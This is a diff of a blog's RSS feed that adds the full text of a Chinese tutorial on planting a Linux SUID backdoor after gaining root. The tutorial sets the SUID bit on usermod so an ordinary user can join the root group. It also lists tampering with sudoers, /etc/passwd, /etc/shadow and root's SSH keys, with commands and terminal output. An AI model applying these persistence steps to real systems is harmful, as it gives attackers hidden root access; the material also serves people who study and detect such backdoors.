@@ -1,19 +1,43 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>backdoor on Reber&#39;s Blog</title>
-    <link>https://wyb0.com/tags/backdoor/</link>
-    <description>Recent content in backdoor on Reber&#39;s Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Mon, 18 Apr 2016 20:03:07 +0000</lastBuildDate>
-    <atom:link href="https://wyb0.com/tags/backdoor/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Linux 之 SUID 后门</title>
-      <link>https://wyb0.com/posts/2016/linux-suid-back-door/</link>
-      <pubDate>Mon, 18 Apr 2016 20:03:07 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/linux-suid-back-door/</guid>
-      <description>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制 0x00 为二进制文件添加s权限从而提升为</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Backdoor on Reber's Blog</title><link>https://wyb0.com/tags/backdoor/</link><description>Recent content in Backdoor on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 18 Apr 2016 20:03:07 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/backdoor/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux 之 SUID 后门</title><link>https://wyb0.com/posts/2016/linux-suid-back-door/</link><pubDate>Mon, 18 Apr 2016 20:03:07 +0000</pubDate><guid>https://wyb0.com/posts/2016/linux-suid-back-door/</guid><description>&lt;p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制&lt;/p>
+&lt;h3 id="0x00-为二进制文件添加s权限从而提升为root权限">0x00 为二进制文件添加s权限从而提升为root权限&lt;/h3>
+&lt;ul>
+&lt;li>写sudoers添加用户 &lt;code>//最佳方案&lt;/code>&lt;/li>
+&lt;li>vim /etc/passwd &lt;code>//将uid和gid改为0&lt;/code>&lt;/li>
+&lt;li>vim /etc/shadow &lt;code>//密文覆盖&lt;/code>&lt;/li>
+&lt;li>vim root .ssh/证书文件 &lt;code>.ssh这个文件夹和证书的权限要正确，要和原来一致&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x01-suid主要作用可以是留后门">0x01 SUID主要作用可以是留后门&lt;/h3>
+&lt;ul>
+&lt;li>在root权限下给usermod一个s权限&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># which usermod #得到usermod的路径 &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/sbin/usermod
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># chmod u+s /usr/sbin/usermod&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ls -l /usr/sbin/usermod&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwsr-x---. &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">98680&lt;/span> Dec &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">2011&lt;/span> /usr/sbin/usermod
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>usermod给其他人一个x权限&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># chmod o+x /usr/sbin/usermod&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># ls -l /usr/sbin/usermod&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwsr-x--x. &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">98680&lt;/span> Dec &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">2011&lt;/span> /usr/sbin/usermod
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>切换到普通用户wyb&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ id wyb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ usermod -g root wyb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ id wyb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>0&lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>0&lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ exit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>验证&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>重新用wyb连接，此时即为root权限
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ cd /root &lt;span style="color:#75715e">#若能切换到此目录即证明确实获得了root权限&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost root&lt;span style="color:#f92672">]&lt;/span>$ ls
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>anaconda-ks.cfg install.log install.log.syslog
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-查找拥有s权限的文件">0x02 查找拥有s权限的文件&lt;/h3>
+&lt;ul>
+&lt;li>find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/li>
+&lt;/ul></description></item></channel></rss>
